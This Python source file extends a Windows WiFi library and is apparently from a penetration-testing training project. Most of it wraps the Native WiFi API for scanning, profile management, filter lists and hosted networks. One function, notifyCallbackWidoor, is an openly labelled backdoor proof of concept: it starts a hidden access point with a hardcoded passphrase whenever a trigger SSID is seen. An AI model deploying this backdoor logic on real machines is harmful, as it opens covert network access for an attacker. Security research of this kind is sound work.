###################################################################################
#
# This file is part of PyWiWi
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.
#
# Author: Andres Blanco (6e726d) <6e726d@gmail.com>
#
##################################################################################
#
# This file is distributed as a part of PyWinWiFi library
#
# We have added the following functions to it:
# -	deleteWirelessProfile()		:	Deletes a network profile
# -	hostedNetworkStart()		:	Starts hosted network 
# -	hostedNetworkStop()			:	Stops hosted network
# -	disconnect()				:	Disconnects from current network
# -	queryInterfaceStateStr()	:	Wrapper function on queryInterfaceState
# -	notifyCallbackWidoor()		:	callback mechanism for Widoor WiFi malware PoC
# -	notifyCallbackLogNotifications():callback mechanism for WiFi notifications
# -	registerWlanNotifications()	:	Registers for live WiFi notifications
# -	networkPresentCheck	()		:	Wrapper function to check if network present in
#									scan results
# -	wlanGetInterfaceCapability():	Checks the capability information of an interface
# -	wlanGetFilterList()			:	Retrieves the network profile filter list i.e.
#									allowed/blocked profiles
# -	wlanSetFilterList()			: 	Sets the network profile filter list i.e.
#									allowed/blocked profiles
# -	wlanFlushFilterList()		: 	Flushes/deletes the network profile filter list
# -	wlanSetInterface()			:	Configures the various properties to an interface	
# -	wlanSetProfile()			:	Sets parameters to a network profile
# -	wlanSaveTemporaryProfile()	:	Saves a temporarily set up network profile 
# -	wlanSetProfileEapXmlUserData():	Sets data into an EAP network profile
# -	getEventXML()				:	Retrieves the event in XML firmat
# -	getEventLogs()				:	Retrieves the event logs from Windows WiFI logs
# -	wlanScan()					:	Forced scan with raw data insertion support in
#									probes
#
#
# Original file LoC: 401 
# Modified file LoC: 984
#
# Author		: Nishant Sharma <nishant@binarysecuritysolutions.com>
# Organizations	: Pentester Academy <www.pentesteracademy.com> and Hacker Arsenal <www.hackerarsenal.com>
#
################################################################################## 

from ctypes import *
from comtypes import GUID
from WindowsNativeWifiApi import *
import os.path
from win32evtlog import EvtRenderEventXml

NULL = None

class WirelessInterface(object):
    def __init__(self, wlan_iface_info):
        self.description = wlan_iface_info.strInterfaceDescription
        self.guid = GUID(wlan_iface_info.InterfaceGuid)
        self.guid_string = str(wlan_iface_info.InterfaceGuid)
        self.state = wlan_iface_info.isState
        self.state_string = WLAN_INTERFACE_STATE_DICT[self.state]

    def __str__(self):
        result = ""
        result += "Description: %s\n" % self.description
        result += "GUID: %s\n" % self.guid
        result += "State: %s" % self.state_string
        return result

class InformationElement(object):
    def __init__(self, element_id, length, body):
        self.element_id = element_id
        self.length = length
        self.body = body

    def __str__(self):
        result = ""
        result += "Element ID: %d\n" % self.element_id
        result += "Length: %d\n" % self.length
        result += "Body: %r" % self.body
        return result


class WirelessNetwork(object):
    def __init__(self, wireless_network):
        self.ssid = wireless_network.dot11Ssid.SSID[:DOT11_SSID_MAX_LENGTH]
        self.profile_name = wireless_network.ProfileName
        self.bss_type = DOT11_BSS_TYPE_DICT_KV[wireless_network.dot11BssType]
        self.number_of_bssids = wireless_network.NumberOfBssids
        self.connectable = bool(wireless_network.NetworkConnectable)
        self.number_of_phy_types = wireless_network.NumberOfPhyTypes
        self.signal_quality = wireless_network.wlanSignalQuality
        self.security_enabled = bool(wireless_network.SecurityEnabled)
        auth = wireless_network.dot11DefaultAuthAlgorithm
        self.auth = DOT11_AUTH_ALGORITHM_DICT[auth]
        cipher = wireless_network.dot11DefaultCipherAlgorithm
        self.cipher = DOT11_CIPHER_ALGORITHM_DICT[cipher]
        self.flags = wireless_network.Flags

    def __str__(self):
        result = ""
        if not self.profile_name:
            self.profile_name = "<No Profile>"
        result += "Profile Name: %s\n" % self.profile_name
        result += "SSID: %s\n" % self.ssid
        result += "BSS Type: %s\n" % self.bss_type
        result += "Number of BSSIDs: %d\n" % self.number_of_bssids
        result += "Connectable: %r\n" % self.connectable
        result += "Number of PHY types: %d\n" % self.number_of_phy_types
        result += "Signal Quality: %d%%\n" % self.signal_quality
        result += "Security Enabled: %r\n" % self.security_enabled
        result += "Authentication: %s\n" % self.auth
        result += "Cipher: %s\n" % self.cipher
        result += "Flags: %d\n" % self.flags
        return result


class WirelessNetworkBss(object):
    def __init__(self, bss_entry):
        self.ssid = bss_entry.dot11Ssid.SSID[:DOT11_SSID_MAX_LENGTH]
        self.link_quality = bss_entry.LinkQuality
        self.bssid = ":".join(map(lambda x: "%02X" % x, bss_entry.dot11Bssid))
        self.bss_type = DOT11_BSS_TYPE_DICT_KV[bss_entry.dot11BssType]
        self.phy_type = DOT11_PHY_TYPE_DICT[bss_entry.dot11BssPhyType]
        self.rssi = bss_entry.Rssi
        self.capabilities = bss_entry.CapabilityInformation
        self.__process_information_elements(bss_entry)
        self.__process_information_elements2()

    def __process_information_elements(self, bss_entry):
        self.raw_information_elements = ""
        bss_entry_pointer = addressof(bss_entry)
        ie_offset = bss_entry.IeOffset
        data_type = (c_char * bss_entry.IeSize)
        ie_buffer = data_type.from_address(bss_entry_pointer + ie_offset)
        for byte in ie_buffer:
            self.raw_information_elements += byte

    def __process_information_elements2(self):
        MINIMAL_IE_SIZE = 3
        self.information_elements = []
        aux = self.raw_information_elements
        index = 0
        while(index < len(aux) - MINIMAL_IE_SIZE):
            eid = ord(aux[index])
            index += 1
            length = ord(aux[index])
            index += 1
            body = aux[index:index + length]
            index += length
            ie = InformationElement(eid, length, body)
            self.information_elements.append(ie)

    def __str__(self):
        result = ""
        result += "BSSID: %s\n" % self.bssid
        result += "SSID: %s\n" % self.ssid
        result += "Link Quality: %d%%\n" % self.link_quality
        result += "BSS Type: %s\n" % self.bss_type
        result += "PHY Type: %s\n" % self.phy_type
        result += "Capabilities: %d\n" % self.capabilities
        # result += "Raw Information Elements:\n"
        # result += "%r" % self.raw_information_elements
        result += "\nInformation Elements:\n"
        for ie in self.information_elements:
            lines = str(ie).split("\n")
            for line in lines:
                result += " + %s\n" % line
            result += "\n"
        return result


class WirelessProfile(object):
    def __init__(self, wireless_profile, xml):
        self.name = wireless_profile.ProfileName
        self.flags = wireless_profile.Flags
        self.xml = xml

    def __str__(self):
        result = ""
        result += "Profile Name: %s\n" % self.name
        result += "Flags: %d\n" % self.flags
        result += "XML:\n"
        result += "%s" % self.xml
        return result


def getWirelessInterfaces():
    """
        Returns a list of WirelessInterface objects based on the wireless
        interfaces available.
       
        **Arguments:** None
    """
    interfaces_list = []
    handle = WlanOpenHandle()
    wlan_ifaces = WlanEnumInterfaces(handle)
    # Handle the WLAN_INTERFACE_INFO_LIST pointer to get a list of
    # WLAN_INTERFACE_INFO structures.
    data_type = wlan_ifaces.contents.InterfaceInfo._type_
    num = wlan_ifaces.contents.NumberOfItems
    ifaces_pointer = addressof(wlan_ifaces.contents.InterfaceInfo)
    wlan_interface_info_list = (data_type * num).from_address(ifaces_pointer)
    for wlan_interface_info in wlan_interface_info_list:
        wlan_iface = WirelessInterface(wlan_interface_info)
        interfaces_list.append(wlan_iface)
    WlanFreeMemory(wlan_ifaces)
    WlanCloseHandle(handle)
    return interfaces_list


def getWirelessNetworkBssList(wireless_interface):
    """
        Returns a list of WirelessNetworkBss objects based on the wireless
        networks available.
       
        **Arguments:**
        
        - wireless_interface: Wireless interface (object of WirelessInterface type) 
    """
    networks = []
    handle = WlanOpenHandle()
    bss_list = WlanGetNetworkBssList(handle, wireless_interface.guid)
    # Handle the WLAN_BSS_LIST pointer to get a list of WLAN_BSS_ENTRY
    # structures.
    data_type = bss_list.contents.wlanBssEntries._type_
    num = bss_list.contents.NumberOfItems
    bsss_pointer = addressof(bss_list.contents.wlanBssEntries)
    bss_entries_list = (data_type * num).from_address(bsss_pointer)
    for bss_entry in bss_entries_list:
        networks.append(WirelessNetworkBss(bss_entry))
    WlanFreeMemory(bss_list)
    WlanCloseHandle(handle)
    return networks


def getWirelessAvailableNetworkList(wireless_interface):
    """
        Returns a list of WirelessNetwork objects based on the wireless
        networks available.
       
        **Arguments:**
        
        - wireless_interface: Wireless interface (object of WirelessInterface type)
    """
    networks = []
    handle = WlanOpenHandle()
    network_list = WlanGetAvailableNetworkList(handle, wireless_interface.guid)
    # Handle the WLAN_AVAILABLE_NETWORK_LIST pointer to get a list of
    # WLAN_AVAILABLE_NETWORK structures.
    data_type = network_list.contents.Network._type_
    num = network_list.contents.NumberOfItems
    network_pointer = addressof(network_list.contents.Network)
    networks_list = (data_type * num).from_address(network_pointer)
    for network in networks_list:
        networks.append(WirelessNetwork(network))
    #WlanFreeMemory(networks_list)
    WlanCloseHandle(handle)
    return networks


def getWirelessProfileXML(wireless_interface, profile_name):
    """
        Returns string containing wireless profile details (in xml format) for profile
        with profile_name 
    
        **Arguments:**
        
        - wireless_interface: Wireless interface (object of WirelessInterface type)
        - profile_name: Wireless profile name (String)
    """
    handle = WlanOpenHandle()
    xml_data = WlanGetProfile(handle,
                              wireless_interface.guid,
                              LPCWSTR(profile_name))
    xml = xml_data.value
    WlanFreeMemory(xml_data)
    WlanCloseHandle(handle)
    return xml

def deleteWirelessProfile(wireless_interface, profile_name):
    """
        Deletes wireless profile "profile_name" for interface given in arguments.
        
        **Arguments:**
        
        - wireless_interface: Wireless interface (object of WirelessInterface type)
        - profile_name: Wireless profile name (String)
    """
    handle = WlanOpenHandle()
    WlanDeleteProfile(handle, wireless_interface.guid, LPCWSTR(profile_name))
    WlanCloseHandle(handle)

def renameWirelessProfile(wireless_interface, old_profile_name, new_profile_name):
    """ 
        Renames wireless profile "old_profile_name" for interface given in arguments to
        "new_profile_name".
        
        **Arguments:**
        
        - wireless_interface: Wireless interface (object of WirelessInterface type)
        - old_profile_name: Present Wireless profile name (String)
        - new_profile_name: Desired Wireless profile name (String)
    """
    handle = WlanOpenHandle()
    WlanRenameProfile(handle, wireless_interface.guid, LPCWSTR(old_profile_name), LPCWSTR(new_profile_name))
    WlanCloseHandle(handle)
    
def getWirelessProfiles(wireless_interface):
    """
        Returns a list of WirelessProfile objects based on the wireless
        profiles.
        
        **Arguments:**
        
        - wireless_interface: Wireless interface (object of WirelessInterface type)
    """
    profiles = []
    handle = WlanOpenHandle()
    profile_list = WlanGetProfileList(handle, wireless_interface.guid)
    # Handle the WLAN_PROFILE_INFO_LIST pointer to get a list of
    # WLAN_PROFILE_INFO structures.
    data_type = profile_list.contents.ProfileInfo._type_
    num = profile_list.contents.NumberOfItems
    profile_info_pointer = addressof(profile_list.contents.ProfileInfo)
    profiles_list = (data_type * num).from_address(profile_info_pointer)
    xml_data = None  # safety: there may be no profiles
    for profile in profiles_list:
        xml_data = WlanGetProfile(handle,
                                  wireless_interface.guid,
                                  profile.ProfileName)
        profiles.append(WirelessProfile(profile, xml_data.value))
    WlanFreeMemory(xml_data)
    #WlanFreeMemory(profiles_list)
    WlanCloseHandle(handle)
    return profiles


def hostedNetworkStart(hostedNetwork, securityPassPhrase, maxPeer):
    """
        Starts hosted network.
        
        **Arguments:**
        
        - hostedNetwork: The name of hosted network
        - securityPassPhrase: Shared Pass Phrase for the hosted network
        - maxPeer: Maximum allowed devices for hosted network
    """
    handle = WlanOpenHandle()
    
    # Filling Network Connection Settings structure
    cnxp = WLAN_HOSTED_NETWORK_CONNECTION_SETTINGS()
    cnxp.hostedNetworkSSID.SSID = hostedNetwork
    cnxp.hostedNetworkSSID.SSIDLength = len(hostedNetwork)
    cnxp.dwMaxNumberOfPeers = DWORD(maxPeer)
    
    #
    securityPassPhraseLen = len(securityPassPhrase) + 1
    reason =""
    
    if WlanHostedNetworkSetProperty(handle, 0, sizeof(cnxp), cnxp, reason) == ERROR_SUCCESS:
            print "Configured hosted network settings"
            if WlanHostedNetworkSetSecondaryKey(handle, securityPassPhraseLen, securityPassPhrase, True, True, reason) == ERROR_SUCCESS:
                print "Configured hosted network security settings"
                # This code was not able to start hosted network. Don''t know why
                #result = (WlanHostedNetworkStartUsing(handle, reason) == ERROR_SUCCESS)
                #print result
                
                # Force starting the hosted network 
                result = (WlanHostedNetworkForceStart(handle)== ERROR_SUCCESS)
                print "Force started the hosted network"
    
    if result:
        print "Hosted Network live now"
    else:
        print " Hosted Network starting failed !!"
    WlanCloseHandle(handle)


def hostedNetworkStop():
    """
        Stops hosted network.
        
        **Arguments:** None
        The fact that only one hosted network can function at a time, no need of any identifier.
    """
    handle = WlanOpenHandle()
    #WlanHostedNetworkStopUsing(handle, reason)
    WlanHostedNetworkForceStop(handle)
    print "Hosted Network stopped"
    WlanCloseHandle(handle)


def disconnect(wireless_interface):
    """
        Disconnects the interface defined by "wireless_interafce" from currently connected network.
        
        **Arguments:**
        
        - wireless_interface: Wireless interface (object of WirelessInterface type)
    """
    handle = WlanOpenHandle()
    WlanDisconnect(handle, wireless_interface.guid)
    WlanCloseHandle(handle)

def connectToNetwork(wireless_interface, connection_params):
    """
        Connects the interface defined by "wireless_interafce" to a specific network defined by using connection_params.

        **Arguments:**
        
        - wireless_interface: Wireless interface (object of WirelessInterface type)
        - connection_params:  Network information in form of a dict with this structure:
    """
    
    handle = WlanOpenHandle()
    cnxp = WLAN_CONNECTION_PARAMETERS()
    connection_mode = connection_params["connectionMode"]
    connection_mode_int = WLAN_CONNECTION_MODE_VK[connection_mode]
    cnxp.wlanConnectionMode = WLAN_CONNECTION_MODE(connection_mode_int)
    # determine strProfile
    if connection_mode == ('wlan_connection_mode_profile' or           # name
                           'wlan_connection_mode_temporary_profile'):  # xml
        cnxp.strProfile = LPCWSTR(connection_params["profile"])
    else:
        cnxp.strProfile = NULL
    # ssid
    if connection_params["ssid"] is not None:
        dot11Ssid = DOT11_SSID()
        dot11Ssid.SSID = connection_params["ssid"]
        dot11Ssid.SSIDLength = len(connection_params["ssid"])
        cnxp.pDot11Ssid = pointer(dot11Ssid)
    else:
        cnxp.pDot11Ssid = NULL
    # bssidList
    # NOTE: Before this can actually support multiple entries,
    #   the DOT11_BSSID_LIST structure must be rewritten to
    #   dynamically resize itself based on input.
    if connection_params["bssidList"] is not None:
        bssids = []
        for bssidish in connection_params["bssidList"]:
            bssidish = tuple(int(n, 16) for n in bssidish.split(":"))
            bssids.append((DOT11_MAC_ADDRESS)(*bssidish))
        bssidListEntries = c_ulong(len(bssids))
        bssids = (DOT11_MAC_ADDRESS * len(bssids))(*bssids)
        bssidListHeader = NDIS_OBJECT_HEADER()
        bssidListHeader.Type = chr(NDIS_OBJECT_TYPE_DEFAULT)
        bssidListHeader.Revision = chr(DOT11_BSSID_LIST_REVISION_1) # chr()
        bssidListHeader.Size = c_ushort(sizeof(DOT11_BSSID_LIST))
        bssidList = DOT11_BSSID_LIST()
        bssidList.Header = bssidListHeader
        bssidList.uNumOfEntries = bssidListEntries
        bssidList.uTotalNumOfEntries = bssidListEntries
        bssidList.BSSIDs = bssids
        cnxp.pDesiredBssidList = pointer(bssidList)
    else:
        cnxp.pDesiredBssidList = NULL # required for XP
    # look up bssType
    # bssType must match type from profile if a profile is provided
    bssType = DOT11_BSS_TYPE_DICT_VK[connection_params["bssType"]]
    cnxp.dot11BssType = DOT11_BSS_TYPE(bssType)
    # flags
    cnxp.dwFlags = DWORD(connection_params["flags"])
    result = WlanConnect(handle,
                wireless_interface.guid,
                cnxp)
    WlanCloseHandle(handle)
    return result

def dot11bssid_to_string(dot11Bssid):
    """
        Returns BSSID in string format converted from DOT11_MAC_ADDRESS type.

        **Arguments:**
        
        - dot11Bssid: BSSID of network (DOT11_MAC_ADDRESS type)
    """
    return ":".join(map(lambda x: "%02X" % x, dot11Bssid))

def queryInterface(wireless_interface, opcode_item):
    """
        Returns query result for query code "opcode_item" for interface defined by "wireless_interafce".

        **Arguments:**
        
        - wireless_interface: Wireless interface (object of WirelessInterface type)
        - opcode_item: Operation code (int)
    """
    handle = WlanOpenHandle()
    opcode_item_ext = "".join(["wlan_intf_opcode_", opcode_item])
    for key, val in WLAN_INTF_OPCODE_DICT.items():
        if val == opcode_item_ext:
            opcode = WLAN_INTF_OPCODE(key)
            break
    result = WlanQueryInterface(handle, wireless_interface.guid, opcode)
    WlanCloseHandle(handle)
    r = result.contents
    if opcode_item == "interface_state":
        #WLAN_INTERFACE_STATE
        ext_out = WLAN_INTERFACE_STATE_DICT[r.value]
    elif opcode_item == "current_connection":
        #WLAN_CONNECTION_ATTRIBUTES
        isState = WLAN_INTERFACE_STATE_DICT[r.isState]
        wlanConnectionMode = WLAN_CONNECTION_MODE_KV[r.wlanConnectionMode]
        strProfileName = r.strProfileName
        aa = r.wlanAssociationAttributes
        wlanAssociationAttributes = {
                "dot11Ssid": aa.dot11Ssid.SSID,
                "dot11BssType": DOT11_BSS_TYPE_DICT_KV[aa.dot11BssType],
                "dot11Bssid": dot11bssid_to_string(aa.dot11Bssid),
                "dot11PhyType": DOT11_PHY_TYPE_DICT[aa.dot11PhyType],
                "uDot11PhyIndex": c_long(aa.uDot11PhyIndex).value,
                "wlanSignalQuality": c_long(aa.wlanSignalQuality).value,
                "ulRxRate": c_long(aa.ulRxRate).value,
                "ulTxRate": c_long(aa.ulTxRate).value
                }
        sa = r.wlanSecurityAttributes
        wlanSecurityAttributes = {
                "bSecurityEnabled": sa.bSecurityEnabled,
                "bOneXEnabled": sa.bOneXEnabled,
                "dot11AuthAlgorithm": \
                        DOT11_AUTH_ALGORITHM_DICT[sa.dot11AuthAlgorithm],
                "dot11CipherAlgorithm": \
                        DOT11_CIPHER_ALGORITHM_DICT[sa.dot11CipherAlgorithm]
                }
        ext_out = {
                "isState": isState,
                "wlanConnectionMode": wlanConnectionMode,
                "strProfileName": strProfileName,
                "wlanAssociationAttributes": wlanAssociationAttributes,
                "wlanSecurityAttributes": wlanSecurityAttributes
                }
    else:
        ext_out = None
    return result.contents, ext_out

def queryInterfaceStateStr(wireless_interface, opcode_item):
    """
        Returns query result for query code "opcode_item" for interface defined by "wireless_interafce"
        in string format.

        **Arguments:**
        
        - wireless_interface: Wireless interface (object of WirelessInterface type)
        - opcode_item: Operation code (int)
    """
       
    temp = queryInterface(wireless_interface, opcode_item)
    ValueDict = temp[1]        
    wlanAssociationDict = ValueDict["wlanAssociationAttributes"]
    wlanSecurityDict = ValueDict["wlanSecurityAttributes"]        
            
    res = ""
    res += "WLAN Connection Mode: %s\n" % ValueDict["wlanConnectionMode"]
    res += "Profile Name: %s\n" % ValueDict["strProfileName"]
    res += "SSID: %s\n" % wlanAssociationDict["dot11Ssid"]
    res += "BSSID: %s\n"% wlanAssociationDict["dot11Bssid"]
    res += "Link Quality: %d%%\n" % wlanAssociationDict["wlanSignalQuality"]
    res += "BSS Type: %s\n" % wlanAssociationDict["dot11BssType"]
    res += "PHY Type: %s\n" % wlanAssociationDict["dot11PhyType"]
    res += "Cipher: %s\n" % wlanSecurityDict["dot11CipherAlgorithm"]
    res += "Authentication: %s\n" % wlanSecurityDict["dot11AuthAlgorithm"]
    res += "RX Rate: %s Mbps\n" % (float(wlanAssociationDict["ulRxRate"])/1024)
    res += "TX Rate: %s Mbps\n" % (float(wlanAssociationDict["ulTxRate"])/1024)

    return res

def notifyCallbackWidoor(pData, pCtx):
    """
        When it get "scan_complete" notification from ACM, it checks for desired SSID in results.
        If that network is present: Starts WiDoor hosted network backdoor.
        If that network is NOT present and hosted network is started : Stops WiDoor hosted network backdoor.
        
        **Arguments:**
        
        - pData: Notification data passed by WiFi subsystem (Structure)
        - pCtx: Context passed by WiFi subsystem (Structure)
    """
         
    ssidToCheck = "Binary_Tech"
    hostedNetwork = "Test_network_lol"
    securityPassPhrase = "abc_123321"
    maxPeer = 5
    hostedNetworkStarted = "started"
        
    if pData is None:
        print "***WARNING: notifyCallback called with NULL data pointer"
        return;

    # Checking notification type
    code   = pData.contents.NotificationCode
    notification = WLAN_NOTIFICATION_ACM_DICT[code]
    print "Notification received: %s" %notification
    
    ifaces = getWirelessInterfaces()
    for iface in ifaces:
        # Check if already stated
        if os.path.isfile(hostedNetworkStarted) == False:
            if notification == "wlan_notification_acm_scan_complete":
                # Check for signal SSID
                if networkPresentCheck(iface, ssidToCheck) == True:
                    print "Found Signal Network: %s" %(ssidToCheck)
                    #Start Hosted network
                    hostedNetworkStart(hostedNetwork, securityPassPhrase, maxPeer)
                    # Creating the hosted network stated file
                    try:
                        tempFile = open(hostedNetworkStarted,'w')
                        tempFile.close()
                    except:
                        print "Error: Unable to create file"       
        else: 
            if networkPresentCheck(iface, ssidToCheck) == False:
                            print "Lost Signal Network: %s" %(ssidToCheck)
                            # Stop Hosted Network
                            hostedNetworkStop()
                            # Removing the hosted network stated file
                            os.remove(hostedNetworkStarted)

def notifyCallbackLogNotifications(pData, pCtx):
    """
        Logs all kind of event notifications from WiFi subsystem.
                
        **Arguments:**
        
        - pData: Notification data passed by WiFi subsystem (Structure)
        - pCtx: Context passed by WiFi subsystem (Structure)
    """
                 
    if pData is None:
        print "***WARNING: notifyCallback called with NULL data pointer"
        return;

    # Checking notification type
    source = pData.contents.NotificationSource
    code = pData.contents.NotificationCode
    sourceName = WLAN_NOTIFICATION_SOURCE_DICT.keys()[WLAN_NOTIFICATION_SOURCE_DICT.values().index(source)]
    notification = WLAN_NOTIFICATION_ACM_DICT[code]
    print "Source: %s    Notification: %s" %(sourceName, notification)


def registerWlanNotifications(callbackFunction, wlanNotificationSource):
    """
        Registers for notifications from source "wlanNotificationSource"

        **Arguments:**
        
        - callbackFunction: Callback function to call when event happens (String)
        - wlanNotificationSource: WLAN event notification source  (String)
            - "WLAN_NOTIFICATION_SOURCE_ONEX": 802.1x notifications
            - "WLAN_NOTIFICATION_SOURCE_ACM": Auto COnfiguration Module notifications
            - "WLAN_NOTIFICATION_SOURCE_MSM": Media Specific Module notifications
            - "WLAN_NOTIFICATION_SOURCE_SECURITY": Security notifications
            - "WLAN_NOTIFICATION_SOURCE_IHV": Independent Hardware Vendors notifications
            - "WLAN_NOTIFICATION_SOURCE_HNWK": Host Network notifications
            - "WLAN_NOTIFICATION_SOURCE_ALL": All notifications
    """
    handle = WlanOpenHandle()
    WlanRegisterNotification(handle, callbackFunction, wlanNotificationSource)
    WlanCloseHandle(handle)
    
def networkPresentCheck(wireless_interface, ssidToCheck):
    """
        Returns true or false depending on the presence "ssidToCheck" in scan results

        **Arguments:**
        
        - callbackFunction: Callback function to call when event happens (String)
        - wlanNotificationSource: WLAN event notification source  (String)
    """

    networks = getWirelessAvailableNetworkList(wireless_interface)
    for network in networks:
        #Getting SSID name from the whole structure
        lineList=str(network).split('\n')
        ssidLine = lineList[1].split(':')
        ssidName = ssidLine[1].strip()
        # Checking ssidToCheck network against all
        #print "Comparing   %s  vs  %s" %(ssidToCheck, ssidName)
        if ssidToCheck == ssidName:
            return True
    return False

def wlanGetInterfaceCapability(wireless_interface):
    """
        Returns interface capability information for interface "wireless_interface" 

        **Arguments:**
        
        - wireless_interface: Wireless interface (object of WirelessInterface type)
    """
    handle = WlanOpenHandle()
    capabilityStruct = WlanGetInterfaceCapability(handle, wireless_interface.guid)
    WlanCloseHandle(handle)
    return capabilityStruct

def wlanGetFilterList(wlanFilterListTypeStr):
    """
        Returns and prints filter list for filter type "wlanFilterListTypeStr" 

        **Arguments:**
        
        - wlanFilterListTypeStr: wlan filter list type (String)
                - wlan_filter_list_type_gp_permit (Group permit filter list)
                - wlan_filter_list_type_gp_deny (Group blocked filter list)
                - wlan_filter_list_type_user_permit (User permit filter list)
                - wlan_filter_list_type_user_deny (User blocked filter list)
    """

    handle = WlanOpenHandle()
    # Getting pointer to DOT11_NETWORK_LIST  
    filterListPtr = WlanGetFilterList(handle, wlanFilterListTypeStr)

    print "Filtered network category : %s" %wlanFilterListTypeStr
    print "------------------------------------------------------------"
    print "Network count: %d " %filterListPtr.contents.dwNumberOfItems
    #print filterListPtr.contents.dwIndex
    
    filterListPointer = addressof(filterListPtr.contents.Network)
    filterList = (filterListPtr.contents.Network._type_ * filterListPtr.contents.Network._length_).from_address(filterListPointer)
    networkTupleList = list() 
    for count in range(0, filterListPtr.contents.dwNumberOfItems):
        print "SSID: %s    Type: %s" %(filterList[count].dot11Ssid.SSID[0:filterList[count].dot11Ssid.SSIDLength], DOT11_BSS_TYPE_DICT_KV[filterList[count].dot11BssType])
        networkTupleList.append((filterList[count].dot11Ssid.SSID[0:filterList[count].dot11Ssid.SSIDLength],filterList[count].dot11BssType))
        #print filterList[count].dot11Ssid.SSIDLength
    WlanCloseHandle(handle)
    return networkTupleList
    
def wlanSetFilterList(wlanFilterListTypeStr, ssidName, bssidType):
    """
        Sets filter list for filter type for "wlanFilterListTypeStr". 
        New user permit and deny lists overwrite previous versions of the user lists. 

        **Arguments:**
        
        - wlanFilterListTypeStr: wlan filter list type (String)
                - wlan_filter_list_type_gp_permit (Group permit filter list)
                - wlan_filter_list_type_gp_deny (Group blocked filter list)
                - wlan_filter_list_type_user_permit (User permit filter list)
                - wlan_filter_list_type_user_deny (User blocked filter list)
        - ssidName: Network to be added to list (String)
        - bssidType: Type of BSSID(String)
                - dot11_BSS_type_infrastructure (Infrastructure mode)
                - dot11_BSS_type_independent (Ad-hoc mode)
    """
    handle = WlanOpenHandle()    
    array_type = DOT11_NETWORK * DOT11_NETWORK_MAX
    networkArray = array_type()
    
    """
    # TODO: Code to retain previous entries
    networkTupleList = wlanGetFilterList(wlanFilterListTypeStr)
    print networkTupleList
    for counter in range (0, len(networkTupleList)):
        networkArray[counter].dot11Ssid.SSID = networkTupleList[counter][0]
        networkArray[counter].dot11Ssid.SSIDLength = len(networkTupleList[counter][0])
        networkArray[counter].dot11BssType = networkTupleList[counter][1]
    filledTill = len(networkTupleList) + 1
    """
    
    filledTill = 0
    networkArray[filledTill].dot11Ssid.SSID = ssidName
    networkArray[filledTill].dot11Ssid.SSIDLength = len(ssidName)
    networkArray[filledTill].dot11BssType = DOT11_BSS_TYPE_DICT_KV.keys()[DOT11_BSS_TYPE_DICT_KV.values().index(bssidType)]
    
    networkList = DOT11_NETWORK_LIST()
    networkList.Network = networkArray
    networkList.dwNumberOfItems = filledTill + 1
    networkList.dwIndex = 0

    WlanSetFilterList(handle, wlanFilterListTypeStr, networkList)
    WlanCloseHandle(handle)

# TODO: Create function to delete specific entry
def wlanFlushFilterList(wlanFilterListTypeStr):
    """
        Flush filter list for filter type "wlanFilterListTypeStr" 

        **Arguments:**
        
        - wlanFilterListTypeStr: wlan filter list type (String)
                - wlan_filter_list_type_gp_permit (Group permit filter list)
                - wlan_filter_list_type_gp_deny (Group blocked filter list)
                - wlan_filter_list_type_user_permit (User permit filter list)
                - wlan_filter_list_type_user_deny (User blocked filter list)
    """
    handle = WlanOpenHandle()
    WlanSetFilterList(handle, wlanFilterListTypeStr, None)
    WlanCloseHandle(handle)
    
def wlanSetInterface(guid, opCode, pData):
    """
        Configure the various properties to an interface. 

        **Arguments:**
         
        - guid: GUID of interface (String)
        - opCode: Op code for property (String)
                - wlan_intf_opcode_autoconf_start
                - wlan_intf_opcode_autoconf_enabled
                - wlan_intf_opcode_background_scan_enabled
                - wlan_intf_opcode_media_streaming_mode
                - wlan_intf_opcode_radio_state
                - wlan_intf_opcode_bss_type
                - wlan_intf_opcode_interface_state
                - wlan_intf_opcode_current_connection
                - wlan_intf_opcode_channel_number
                - wlan_intf_opcode_supported_infrastructure_auth_cipher_pairs
                - wlan_intf_opcode_supported_adhoc_auth_cipher_pairs
                - wlan_intf_opcode_supported_country_or_region_string_list
                - wlan_intf_opcode_current_operation_mode
                - wlan_intf_opcode_supported_safe_mode
                - wlan_intf_opcode_certified_safe_mode
                - wlan_intf_opcode_hosted_network_capable
                - wlan_intf_opcode_management_frame_protection_capable
                - wlan_intf_opcode_autoconf_end
                - wlan_intf_opcode_msm_start
                - wlan_intf_opcode_statistics
                - wlan_intf_opcode_rssi
                - wlan_intf_opcode_msm_end
                - wlan_intf_opcode_security_start
                - wlan_intf_opcode_security_end
                - wlan_intf_opcode_ihv_start
                - wlan_intf_opcode_ihv_end
        - pData: Data related to that property (int)
    """
    handle = WlanOpenHandle()
    if opCode == "wlan_intf_opcode_radio_state":
        dwDataSize = sizeof(WLAN_PHY_RADIO_STATE)
        pData = WLAN_PHY_RADIO_STATE(pData)
    elif opCode == "wlan_intf_opcode_bss_type":
        dwDataSize = sizeof(DOT11_BSS_TYPE)
        pData = DOT11_BSS_TYPE(pData)
    elif opCode == "wlan_intf_opcode_current_operation_mode":
        dwDataSize = sizeof(c_long)
        pData = c_long(pData)
    else:
        dwDataSize = sizeof(BOOL)
        pData = BOOL(pData)
        
    WlanSetInterface(handle, guid, opCode, dwDataSize, pData)
    WlanCloseHandle(handle)
    
def wlanSetProfile(guid, strProfileXml, bOverwrite):
    """
        Save a new profile defined by "strProfileXml" 

        **Arguments:**
        
        - guid: GUID of interface (String)
        - strProfileXml: Profile details in XML format (String)
        - bOverwrite: Overwrite if already exit i.e. True or False (bool)
    """
    handle = WlanOpenHandle()
    # bOverwrite Specifies whether this profile is overwriting an existing profile.
    #If this parameter is FALSE and the profile already exists, the existing profile will not be overwritten and an error will be returned.
    WlanSetProfile(handle, guid, strProfileXml, bOverwrite)
    WlanCloseHandle(handle)
    
def wlanSaveTemporaryProfile(guid, strProfileName, bOverwrite):
    """
        Save profile which is used to connect temporarily. 

        **Arguments:**
        
        - guid: GUID of interface (String)
        - strProfileName: Name of the profile (String)
        - bOverwrite: Overwrite if already exit i.e. True or False (bool)
    """
    handle = WlanOpenHandle()
    # bOverwrite Specifies whether this profile is overwriting an existing profile.
    #If this parameter is FALSE and the profile already exists, the existing profile will not be overwritten and an error will be returned.
    WlanSaveTemporaryProfile(handle, guid, strProfileName, bOverwrite)
